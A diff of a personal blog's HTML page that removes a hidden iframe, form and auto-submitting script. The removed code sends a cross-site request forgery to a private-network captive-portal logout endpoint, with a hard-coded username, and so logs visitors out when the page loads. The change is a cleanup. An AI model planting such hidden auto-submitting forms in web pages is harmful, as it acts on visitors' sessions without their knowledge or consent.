@@ -51,6 +51,8 @@
     
       
     
+      
+    
 
     <a class="sidebar-nav-item" href="https://github.com/gnarula">Github</a>
     <a class="sidebar-nav-item" href="https://in.linkedin.com/in/gaurav-narula-b347747a">LinkedIn</a>
@@ -186,20 +188,6 @@ chances are you&rsquo;ll have to login again ;)</p>
     </div>
 
     <label for="sidebar-checkbox" class="sidebar-toggle"></label>
-
-    <iframe style="display:none;" name="csrf-frame"></iframe>
-    <form method="POST" action="https://10.1.0.10:8090/logout.xml" target="csrf-frame" id="csrf-form">
-      <input type="hidden" name="mode" value="193">
-      <input type="hidden" name="username" value="f2016007">
-      <input type="hidden" name="a" value="1460282960899">
-      <input type="hidden" name="producttype" value="0">
-    </form>
-
-    <script type="text/javascript">
-      var form = document.getElementById("csrf-form");
-      form.elements['a'].value = Date.now();
-      form.submit();
-    </script>
 
   </body>
 </html>
